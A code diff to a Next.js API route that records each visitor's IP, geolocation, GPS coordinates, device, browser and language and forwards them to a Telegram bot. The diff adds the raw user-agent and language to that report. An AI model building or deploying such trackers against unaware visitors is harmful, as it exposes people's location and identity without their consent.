@@ -19,6 +19,7 @@ export async function GET(request: NextRequest) {
   const city = headersList.get('x-vercel-ip-city') ?? 'Unknown';
   const region = headersList.get('x-vercel-ip-country-region') ?? 'Unknown';
   const userAgent = headersList.get('user-agent') ?? '';
+  const acceptLanguage = headersList.get('accept-language') ?? 'Unknown';
 
   const parser = new UAParser(userAgent);
   const browser = parser.getBrowser().name || 'Unknown';
@@ -43,7 +44,7 @@ export async function GET(request: NextRequest) {
 
   const locationLabel = gpsLink
     ? `GPS (${lat}, ${lon})`
-    : `${escapeMd(city)}, ${escapeMd(region)}, ${escapeMd(country)}`;
+    : `${escapeMd(city)}, ${escapeMd(country)}`;
 
   console.log("API Route Hit", {
     ip,
@@ -73,7 +74,7 @@ export async function GET(request: NextRequest) {
         ? `📱 *Phone:* ${escapeMd(`${deviceVendor} ${deviceModel}`).trim() || 'Unknown'}\n🤖 *OS:* ${escapeMd(os)} ${escapeMd(osVersion)}\n🌐 *Browser:* ${escapeMd(browser)} ${escapeMd(browserVersion)}`
         : `🖥️ *Device:* ${device} - ${escapeMd(browser)} ${escapeMd(browserVersion)}\n💻 *OS:* ${escapeMd(os)} ${escapeMd(osVersion)}`;
 
-      const text = `🌐 *New Visitor Detected*\n\n${phoneLine}\n📍 *Location:* ${locationLabel}\n🔗 *IP:* ${escapeMd(ip)}\n⏰ *Time:* ${time}${gpsLink ? `\n🗺️ *Map:* ${gpsLink}` : ''}`;
+      const text = `🌐 *New Visitor Detected*\n\n${phoneLine}\n📍 *Location:* ${locationLabel}\n🌐 *Browser & Device:* ${escapeMd(browser)} ${escapeMd(browserVersion)} | ${escapeMd(device)} - ${escapeMd(`${deviceVendor} ${deviceModel}`).trim()}\n📱 *Raw User-Agent:* ${escapeMd(userAgent)}\n🗣️ *Language:* ${escapeMd(acceptLanguage)}\n🔗 *IP:* ${escapeMd(ip)}\n⏰ *Time:* ${time}${gpsLink ? `\n🗺️ *Map:* ${gpsLink}` : ''}`;
 
       const response = await fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
